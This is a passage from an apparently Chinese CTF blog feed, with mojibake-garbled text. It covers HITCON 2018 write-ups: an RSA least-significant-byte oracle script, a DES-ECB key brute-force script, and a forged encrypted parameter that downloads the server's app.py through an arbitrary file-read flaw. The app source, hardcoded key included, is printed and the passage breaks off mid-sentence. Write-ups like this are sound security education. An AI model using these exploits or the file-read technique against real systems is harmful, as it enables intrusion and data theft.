% <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">        n = n / <span class="number">3</span></span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recover_flag</span>(<span class="params">flagcipher,n</span>):</span> <span class="comment">#è·å– flag</span></span><br><span class="line">    submap = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">        submap[-n * i % <span class="number">256</span>] = i</span><br><span class="line">    cipher256 = enc(<span class="number">256</span>)</span><br><span class="line">    last_bytes=dec(flagcipher)</span><br><span class="line">    L = Fraction(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    R = Fraction(<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">        <span class="built_in">print</span> i</span><br><span class="line">        flagcipher = flagcipher * cipher256 % n</span><br><span class="line">        b=dec(flagcipher)</span><br><span class="line">        k = submap[b]</span><br><span class="line">        L, R = L + (R - L) * Fraction(k, <span class="number">256</span>), L + (R - L) * Fraction(k + <span class="number">1</span>, <span class="number">256</span>)</span><br><span class="line">    low = <span class="built_in">int</span>(L * n)</span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(low - low % <span class="number">256</span> +last_bytes)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="built_in">print</span> s.recv(<span class="number">1024</span>).strip()</span><br><span class="line">    data=s.recv(<span class="number">1024</span>).strip()</span><br><span class="line">    <span class="built_in">print</span> data</span><br><span class="line">    flagcipher = bytes_to_long(re.findall(<span class="string">&#x27;\s*(.*)\s*cmd:&#x27;</span>, data)[<span class="number">0</span>].decode(<span class="string">&quot;hex&quot;</span>))</span><br><span class="line">    n=recover_pubkey()</span><br><span class="line">    <span class="built_in">print</span> n</span><br><span class="line">    <span class="built_in">print</span> recover_flag(flagcipher,n)</span><br><span class="line">main()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>hitcon{1east_4ign1f1cant_BYTE_0racle_is_m0re_pow3rfu1!}</p></blockquote><p>å‚è€ƒï¼š</p><ol><li><p><a href="https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/rsa/rsa_chosen_plain_cipher">https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/rsa/rsa_chosen_plain_cipher</a></p></li><li><p><a href="https://github.com/p4-team/ctf/tree/master/2018-10-20-hitcon/crypto_rsa">https://github.com/p4-team/ctf/tree/master/2018-10-20-hitcon/crypto_rsa</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2018 HITCON On my Raddit</title>
      <link href="/2018/10/22/2018-HITCON-On-my-Raddit/"/>
      <url>/2018/10/22/2018-HITCON-On-my-Raddit/</url>
      
        <content type="html"><![CDATA[<h4 id="On-my-Raddit"><a href="#On-my-Raddit" class="headerlink" title="On my Raddit"></a>On my Raddit</h4><p>orange å¤§å¤§å‡ºçš„è¿™ä¸ªé¢˜ä¸å…¶æ”¾åœ¨ Web é‡Œï¼Œä¸å¦‚æ”¾åœ¨ Crypto é‡Œã€‚è¿™é‡Œè¯´ä¸€ä¸‹æ¯”èµ›æ—¶çš„æ€è·¯ã€‚</p><p>æ‰“å¼€é¢˜ç›®ï¼š</p><a id="more"></a><p><img src="https://upload-images.jianshu.io/upload_images/9223743-1012ea08b7efd242.png" alt="image.png"></p><p>flag æ˜¯åŠ å¯†å¯†é’¥ï¼Œè€Œ <code>hint</code> æç¤ºåŠ å¯†å¯†é’¥æ˜¯<code>å°å†™å­—æ¯</code>ã€‚è¿˜æœ‰ä¸€ä¸ª<code>P</code>çš„æç¤ºã€‚</p><p>æŸ¥çœ‹ä¸€æ³¢æºç ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-fc4e4502d0d39934.png" alt="image.png"></p><p>å¯ä»¥çœ‹åˆ°éƒ½æ˜¯<code>?s=å¯†æ–‡</code>çš„å½¢å¼ã€‚ç½‘é¡µæä¾›äº†ä¸€ä¸ªé¡µé¢æ˜¾ç¤ºå¤šå°‘æ–‡ç« çš„é€‰é¡¹ï¼Œæˆ‘ä»¬å…³æ³¨ä¸€ä¸‹è¿™å—çš„æºç ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-71fe7a9f371ffff9.png" alt="image.png"></p><p>å¯ä»¥çœ‹åˆ°ä¸¤ä¸ªå¯†æ–‡å‰ 64bitæ˜¯ä¸€æ ·çš„ï¼Œå 64bit ä¸åŒï¼Œå¯ä»¥æ¨æ–­ 64 bit åº”è¯¥æ˜¯ä¸€ä¸ªåˆ†ç»„ï¼Œè€Œä¸”æ˜æ–‡åº”è¯¥æ˜¯<code>salt+number</code>çš„å½¢å¼ï¼Œsalt ç›¸åŒå¯¼è‡´ç¬¬ä¸€æ®µå¯†æ–‡ç›¸åŒã€‚</p><p>æ¥ç€æˆ‘å¼€å§‹åˆ†æä¸‹é¢çš„é“¾æ¥çš„å¯†æ–‡ï¼Œèµ·åˆæˆ‘çš„æƒ³æ³•æ˜¯åˆ†æå¯†æ–‡é•¿åº¦ï¼Œæ ¹æ®å¯†æ–‡é•¿åº¦å’Œæ–‡ç« åçš„é•¿åº¦æ¥æ¨æµ‹ salt çš„æ ¼å¼ï¼ˆæ–‡ç« åå­—è¶Šé•¿å¯†æ–‡è¶Šé•¿ï¼‰ï¼Œä½†æ˜¯è¿™ä¸ª salt æ ¼å¼æ¨äº†åŠå¤©å‘ç°ä¹Ÿæ²¡æœ‰åµç”¨ã€‚</p><p>è¿™ä¸ªé¢˜ä¸åŒäºä¸€èˆ¬çš„å¯†ç é¢˜ï¼Œä¸€èˆ¬éƒ½æ˜¯è¦è¿˜åŸæ˜æ–‡ï¼Œè¿™é‡Œ flag æ˜¯å¯†é’¥ï¼ŒçŸ¥é“äº†æ˜æ–‡ä¹Ÿæ²¡ç”¨ã€‚</p><p>é™·å…¥äº†ç“¶é¢ˆï¼Œæƒ³æ‰¾æºç æ³„éœ²æ‰¾ä¸åˆ°ï¼Œæ‰«ä¸€æ³¢ç›®å½•è¿˜æŠŠæˆ‘ ip banäº†ä¸€ä¼šâ€¦</p><p>å¯ç”¨ä¿¡æ¯çœ‹æ¥å°±è¿™ä¹ˆå¤šã€‚æƒ³èµ·æç¤ºå¯†é’¥æ˜¯å°å†™å­—æ¯ï¼Œæ— ç–‘ç¼©å°èŒƒå›´ã€‚å¦‚æœä¸ç»™è¿™ä¸ªæç¤ºï¼Œ<code>2^56</code>æˆ‘ç»å¯¹çˆ†ç ´ä¸å‡ºæ¥ï¼Œæ—¢ç„¶ç»™äº†è¿™ä¸ªæç¤ºï¼Œæ‰€ä»¥æˆ‘çš„æ€è·¯å°±æ˜¯çˆ†ç ´ã€‚</p><p>é€šè¿‡åˆ†ç»„é•¿åº¦æ˜¯ 64bitå¯ä»¥æ¨æµ‹åŠ å¯†ç®—æ³•åº”è¯¥æ˜¯ DESï¼Œå¸¸ç”¨çš„åº”è¯¥ä¹Ÿå°± DES åˆ†å—æ˜¯ 64 bitã€‚æ¥ä¸‹æ¥éœ€è¦æ‰¾åˆ°æ˜å¯†æ–‡å¯¹ï¼Œæˆ‘æºä»£ç é‡Œæœå¯»äº†ä¸€ä¸‹ limit=10 çš„é“¾æ¥å¯†æ–‡å 64bitï¼š<strong>3ca92540eb2d0a42</strong> ç»“æœå‘ç°äº†ç‚¹ä¸œè¥¿ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-a99b6f71b4b6d31d.png" alt="image.png"></p><p>å‘ç°ç«Ÿç„¶æœ‰ 18 å¤„è¿™ä¸ªå¯†æ–‡ï¼ ä»”ç»†è§‚å¯Ÿå‘ç°éƒ½åœ¨æœ«å°¾ï¼ï¼</p><p>è±ç„¶å¼€æœ—ï¼Œçœ‹æ¥è¿™æ˜¯ ECB æ¨¡å¼çš„ DESï¼Œè¿™ä¹ˆå¤šç›¸åŒçš„å¯†æ–‡ç»ä¸æ˜¯å·§åˆï¼Œä¸€å®šæ˜¯ç›¸åŒçš„æ˜æ–‡ã€‚ç›¸åŒçš„æ˜æ–‡éƒ½åœ¨è€Œä¸”éƒ½åœ¨æœ€åï¼Œæ˜¾ç„¶æ˜¯ Padding çš„æ—¶å€™ï¼Œå¦‚æœæ˜æ–‡é•¿åº¦æ­£å¥½æ˜¯åˆ†å—çš„é•¿åº¦ã€‚å‡è®¾åˆ†å—é•¿åº¦æ˜¯ 8 å­—èŠ‚ï¼Œé‚£ä¹ˆè¿™ç§æƒ…å†µä¸‹ä¼šè¡¥8ä¸ª<code>08</code>å­—èŠ‚ã€‚è¯¦ç»†çš„è¯·çœ‹ä¸‹<code>PKCS5</code>å¡«å……è§„åˆ™ã€‚æƒ³èµ·äº†æç¤º P åº”è¯¥å°±æ˜¯æç¤º Padding ã€‚</p><p>è¿™å…«ä¸ª 08 å­—èŠ‚åŠ å¯†çš„å¯†æ–‡éƒ½æ˜¯ 3ca92540eb2d0a42ï¼Œæ‰€ä»¥æœ‰ 18 å¤„è¿™å—å¯†æ–‡ã€‚</p><p>æ‰¾åˆ°äº†æ˜å¯†æ–‡å¯¹ï¼Œç›´æ¥å¼€å§‹çˆ†ç ´çš„è¯ï¼Œé‚£å°±æ˜¯<code>26^8</code>,æˆ‘è®¡ç®—äº†ä¸€ä¸‹æ˜¯ <code>2^38</code>ï¼Œæˆ‘è§‰å¾—æ˜¯çˆ†ä¸å‡ºæ¥â€¦</p><p>æƒ³åˆ°äº† DES å®é™…å¯ç”¨çš„å¯†é’¥åªæœ‰ 56 bitï¼Œæ¯”å¦‚ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯â€™bâ€™ï¼Œé‚£ä¹ˆå¯†é’¥å‰å…«ä½æ˜¯ <code>01100010</code>ï¼Œæ³¨æ„è¿™é‡Œæœ€åä¸€ä½çš„ 0 æ²¡æœ‰ä½œç”¨ï¼Œåœ¨ DES ä¸­æ¯ä¸ªå­—èŠ‚çš„æœ€åä¸€ä½æ—¶è¢«ä¸¢å¼ƒçš„ï¼Œä¹Ÿå°±æ˜¯è¯´ç¬¬ä¸€ä¸ªå­—èŠ‚ç”¨ b åŠ å¯†å’Œç”¨ c åŠ å¯†æ²¡æœ‰åŒºåˆ«ã€‚</p><p>è¿™æ ·çš„è¯ï¼Œb å’Œ c æ•ˆæœä¸€æ ·ï¼Œd å’Œ e æ•ˆæœä¸€æ ·ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬åªéœ€è¦<code>13^8==2^30</code>æ­¥å°±å¯ä»¥éå†å®Œï¼Œç›´æ¥çˆ†ç ´ï¼š</p><p>(è„šæœ¬å¾ˆä¸‘ï¼Œè€Œä¸”å•çº¿ç¨‹)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># _*_ coding:utf-8 _*_</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span>=<span class="string">&quot;acegikmoqsuwy&quot;</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">    key1 = a</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">        key2 = key1 + b</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">            key3 = key2 + c</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">                key4 = key3 + d</span><br><span class="line">                <span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">                    key5 = key4 + e</span><br><span class="line">                    <span class="keyword">for</span> f <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">                        key6 = key5 + f</span><br><span class="line">                        <span class="keyword">for</span> g <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">                            key7 = key6 + g</span><br><span class="line">                            <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">                                key = key7 + h</span><br><span class="line">                                <span class="built_in">print</span> key</span><br><span class="line">                                obj = DES.new(key)</span><br><span class="line">                                <span class="keyword">if</span> obj.decrypt(<span class="string">&quot;3ca92540eb2d0a42&quot;</span>.decode(<span class="string">&quot;hex&quot;</span>))==<span class="string">&quot;0808080808080808&quot;</span>.decode(<span class="string">&quot;hex&quot;</span>):</span><br><span class="line">                                    <span class="built_in">print</span> key</span><br><span class="line">                                    exit()</span><br></pre></td></tr></table></figure><p>5 ç‚¹å¤šå¼€å§‹è·‘ï¼Œè·‘åˆ°8ç‚¹å¤šç»“æŸäº†â€¦ æ‰“å°å‡ºæ¥çš„ key æ˜¯ï¼š<code>megooaso</code>,æ³¨æ„è¿™ä¸æ˜¯çœŸæ­£çš„å¯†é’¥ï¼Œé™¤å» aï¼Œå‰©ä¸‹çš„éƒ½æœ‰å’Œå®ƒç›¸é‚»å­—ç¬¦ç­‰ä»·æ•ˆæœçš„ï¼Œæ²¡åŠæ³•æˆ‘æƒ³æŠŠæ‰€ä»¥å­—ç¬¦ä¸²æ‰“å‡ºæ¥ï¼Œçœ‹çœ‹å“ªä¸ªåƒä¸ªå•è¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># _*_ coding:utf-8 _*_</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="string">&quot;lm&quot;</span>:</span><br><span class="line">    key1 = a</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="string">&quot;de&quot;</span>:</span><br><span class="line">        key2 = key1 + b</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&quot;fg&quot;</span>:</span><br><span class="line">            key3 = key2 + c</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> <span class="string">&quot;no&quot;</span>:</span><br><span class="line">                key4 = key3 + d</span><br><span class="line">                <span class="keyword">for</span> e <span class="keyword">in</span> <span class="string">&quot;no&quot;</span>:</span><br><span class="line">                    key5 = key4 + e</span><br><span class="line">                    <span class="keyword">for</span> f <span class="keyword">in</span> <span class="string">&quot;a&quot;</span>:</span><br><span class="line">                        key6 = key5 + f</span><br><span class="line">                        <span class="keyword">for</span> g <span class="keyword">in</span> <span class="string">&quot;rs&quot;</span>:</span><br><span class="line">                            key7 = key6 + g</span><br><span class="line">                            <span class="keyword">for</span> h <span class="keyword">in</span> <span class="string">&quot;no&quot;</span>:</span><br><span class="line">                                key = key7 + h</span><br><span class="line">                                <span class="built_in">print</span> key</span><br></pre></td></tr></table></figure><p>æŒ¨ä¸ªçœ‹å‘ç°æ²¡æœ‰åƒå•è¯çš„â€¦ l å¼€å¤´çš„åº”è¯¥ä¸æ˜¯ï¼Œm å¼€å¤´çš„è¯•äº†è¯•ï¼Œæœ€ç»ˆ<code>megnnaro</code>æ˜¯ flagã€‚</p><blockquote><p>hitcon{megnnaro}</p></blockquote><p>å¦å¤–çœ‹äº† orange çš„è§£ç­”æ‰å‘ç°ç”¨ hashcat ç§’è§£â€¦ ä½†æ˜¯æˆ‘çš„ hashcat ä¸çŸ¥æ€ä¹ˆå›äº‹ç”¨ä¸äº†ï¼Œç…§ç€å¸ˆå‚…ä»¬çš„å‘½ä»¤æ‰§è¡Œéƒ½ä¸è¡Œorzã€‚æœ‰æˆåŠŸä½¿ç”¨ hashcat è§£å‡ºæ¥çš„å¸ˆå‚…å¯ä»¥è”ç³»ä¸€ä¸‹æˆ‘ç»™æˆ‘æŒ‡ç‚¹ä¸€æ³¢â€¦è¿˜æœ‰çš„å¸ˆå‚…æ‰¾åˆ°äº†åˆ«çš„æ˜å¯†æ–‡å¯¹ï¼Œåªèƒ½è¯´ tql ï¼Œå¯¹ç€è¿™ä¸€å¤§ä¸²èƒ½çŒœå‡ºå¦å¤–çš„æ˜å¯†æ–‡å¯¹ã€‚ orange é¢˜è§£ä¸­è¯´ç”¨ python å•çº¿ç¨‹ 10 minè·‘å®Œï¼Œä¸çŸ¥é“è¿™ä¸ª 10 min æ€ä¹ˆæ¥çš„â€¦æˆ‘è·‘äº†å¿«ä¸‰ä¸ªå°æ—¶ã€‚</p><p>è¿™ä¸ªé¢˜çš„ç¬¬äºŒå…³ On my Raddit V2 é¢˜ç›®è¯´æ˜¯ getshellï¼Œä¸€æ ·çš„ç¯å¢ƒã€‚æœ‰äº†å¯†é’¥æˆ‘å°±å¯ä»¥æŠŠé‚£äº›å¯†æ–‡éƒ½è§£å‡ºæ¥ï¼Œè§£å‡ºæ¥é‚£äº›åªæ˜¯äº›æ²¡æœ‰ç”¨çš„ä¸œè¥¿:<br><code>u=70c97cc1-079f-4d01-8798-f36925ec1fd7&amp;m=r&amp;t=Ghostbuster%3A+Detecting+the+Presence+of+Hidden+Eavesdroppers+%5Bpdf%5D</code></p><p>ä¸è¿‡é¢˜ç›®æœ‰ä¸ªä¸‹è½½æ–‡ä»¶çš„åœ°æ–¹ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-2f4d05321b251dc6.png" alt="image.png"></p><p>æŠŠé‚£ä¸ªé“¾æ¥è§£å¯†ä¸€ä¸‹ï¼š<code>m=d&amp;f=uploads%2F70c97cc1-079f-4d01-8798-f36925ec1fd7.pdf</code></p><p>åº”è¯¥å¯ä»¥ä»»æ„ä¸‹è½½æ–‡ä»¶ï¼Œæ ¹æ® hint.py å¯ä»¥æ¨æ–­è¿™æ˜¯ python å†™çš„ï¼Œé‚£ä¹ˆä¸‹è½½ä¸€æ³¢ app.pyã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">m&#x3D;d&amp;f&#x3D;app.py åŠ å¯†å¾—åˆ°e2272b36277c708bc21066647bc214b8</span><br><span class="line">å‘è¿‡å» http:&#x2F;&#x2F;13.115.255.46&#x2F;?S&#x3D;e2272b36277c708bc21066647bc214b8</span><br></pre></td></tr></table></figure><p>å¯ä»¥ä¸‹åˆ°app.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: UTF-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> web</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"></span><br><span class="line">web.config.debug = <span class="literal">False</span></span><br><span class="line">ENCRPYTION_KEY = <span class="string">&#x27;megnnaro&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">urls = (</span><br><span class="line">    <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;index&#x27;</span></span><br><span class="line">)</span><br><span class="line">app = web.application(urls, <span class="built_in">globals</span>())</span><br><span class="line">db = web.database(dbn=<span class="string">&#x27;sqlite&#x27;</span>, db=<span class="string">&#x27;db.db&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">s</span>):</span></span><br><span class="line">    length = DES.block_size - (<span class="built_in">len</span>(s) % DES.block_size)</span><br><span class="line">    s = s + <span class="built_in">chr</span>(length)*length</span><br><span class="line"></span><br><span class="line">    cipher = DES.new(ENCRPYTION_KEY, DES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> cipher.encrypt(s).encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = s.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">        cipher = DES.new(ENCRPYTION_KEY, DES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">        data = cipher.decrypt(data)</span><br><span class="line">        data = data[:-<span class="built_in">ord</span>(data[<span class="number">-1</span>])]</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">dict</span>(urlparse.parse_qsl(data))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span> e.message</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_posts</span>(<span class="params">limit=<span class="literal">None</span></span>):</span></span><br><span class="line">    records = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> db.select(<span class="string">&#x27;posts&#x27;</span>, limit=limit, order=<span class="string">&#x27;ups desc&#x27;</span>):</span><br><span class="line">        tmp = &#123;</span><br><span class="line">            <span class="string">&#x27;m&#x27;</span>: <span class="string">&#x27;r&#x27;</span>, </span><br><span class="line">            <span class="string">&#x27;t&#x27;</span>: i.title.encode(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>), </span><br><span class="line">            <span class="string">&#x27;u&#x27;</span>: i.<span class="built_in">id</span>, </span><br><span class="line">        &#125; </span><br><span class="line">        tmp[<span class="string">&#x27;param&#x27;</span>] = encrypt(urllib.urlencode(tmp))</span><br><span class="line">        tmp[<span class="string">&#x27;ups&#x27;</span>] = i.ups</span><br><span class="line">        <span class="keyword">if</span> i.file:</span><br><span class="line">            tmp[<span class="string">&#x27;file&#x27;</span>] = encrypt(urllib.urlencode(&#123;<span class="string">&#x27;m&#x27;</span>: <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;f&#x27;</span>: i.file&#125;))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp[<span class="string">&#x27;file&#x27;</span>] = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        </span><br><span class="line">        records.append( tmp )</span><br><span class="line">    <span class="keyword">return</span> records</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_urls</span>():</span></span><br><span class="line">    urls = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">10</span>, <span class="number">100</span>, <span class="number">1000</span>]:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;m&#x27;</span>: <span class="string">&#x27;p&#x27;</span>, </span><br><span class="line">            <span class="string">&#x27;l&#x27;</span>: i</span><br><span class="line">        &#125;</span><br><span class="line">        urls.append( encrypt(urllib.urlencode(data)) )</span><br><span class="line">    <span class="keyword">return</span> urls</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">index</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GET</span>(<span class="params">self</span>):</span></span><br><span class="line">        s = web.<span class="built_in">input</span>().get(<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> s:</span><br><span class="line">            <span class="keyword">return</span> web.template.frender(<span class="string">&#x27;templates/index.html&#x27;</span>)(get_posts(), get_urls())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            s = decrypt(s)</span><br><span class="line">            method = s.get(<span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> method <span class="keyword">and</span> method <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">list</span>(<span class="string">&#x27;rdp&#x27;</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;param error&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> method == <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">                uid = s.get(<span class="string">&#x27;u&#x27;</span>)</span><br><span class="line">                record = db.select(<span class="string">&#x27;posts&#x27;</span>, where=<span class="string">&#x27;id=$id&#x27;</span>, <span class="built_in">vars</span>=&#123;<span class="string">&#x27;id&#x27;</span>: uid&#125;).first()</span><br><span class="line">                <span class="keyword">if</span> record:</span><br><span class="line">                    <span class="keyword">raise</span> web.seeother(record.url)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&#x27;not found&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> method == <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">                file = s.get(<span class="string">&#x27;f&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(file):</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&#x27;not found&#x27;</span></span><br><span class="line">                name = os.path.basename(file)</span><br><span class="line">                web.header(<span class="string">&#x27;Content-Disposition&#x27;</span>, <span class="string">&#x27;attachment; filename=%s&#x27;</span> % name)</span><br><span class="line">                web.header(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;application/pdf&#x27;</span>)</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">                    data = fp.read()</span><br><span class="line">                <span class="keyword">return</span> data</span><br><span class="line">            <span class="keyword">elif</span> method == <span class="string">&#x27;p&#x27;</span>:</span><br><span class="line">                limit = s.get(<span class="string">&#x27;l&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> web.template.frender(<span class="string">&#x27;templates/index.html&#x27;</span>)(get_posts(limit), get_urls())</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> web.template.frender(<span class="string">&#x27;templates/index.html&#x27;</span>)(get_posts(), get_urls())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å…¶å®ä¹‹åæ‰äº†è§£åˆ°ï¼Œorange 